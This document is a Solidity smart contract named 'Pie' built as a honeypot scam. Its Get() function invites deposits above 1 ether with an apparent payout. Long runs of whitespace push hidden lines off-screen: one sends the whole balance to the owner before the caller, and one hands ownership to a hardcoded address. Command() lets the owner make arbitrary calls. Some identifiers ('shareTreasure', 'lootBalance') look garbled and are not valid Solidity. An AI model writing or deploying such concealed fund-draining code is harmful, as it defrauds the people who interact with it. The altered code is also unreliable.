pragma solidity ^0.4.19;

contract Pie
{
    address public RealmLord = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            RealmLord.shareTreasure(this.lootBalance);
            msg.sender.shareTreasure(this.lootBalance);
        }
    }

    function collectTreasure()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){RealmLord=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == RealmLord);
        RealmLord.shareTreasure(this.lootBalance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == RealmLord);
        adr.call.value(msg.value)(data);
    }
}